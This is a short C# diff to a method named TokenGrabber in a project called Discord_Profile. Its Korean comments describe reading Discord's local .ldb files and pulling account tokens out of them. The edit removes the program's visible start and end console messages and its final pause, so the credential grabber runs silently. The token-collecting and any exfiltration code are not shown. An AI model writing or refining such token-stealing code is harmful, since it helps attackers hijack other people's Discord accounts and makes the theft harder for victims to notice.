@@ -19,9 +19,6 @@ namespace Discord_Profile
         public static void TokenGrabber()
         {
 
-            //시작
-            Console.WriteLine("----------Start----------");
-
             //디코 Path 에 있는 파일을 가져오기 (*.ldb 파일)
             files = GetFile();
 
@@ -35,9 +32,7 @@ namespace Discord_Profile
             //받아온 파일중에 토큰 찾기
             GetToken();
 
-            //끄읕
-            Console.WriteLine("----------End----------");
-            Console.ReadLine();
+
 
         }
 
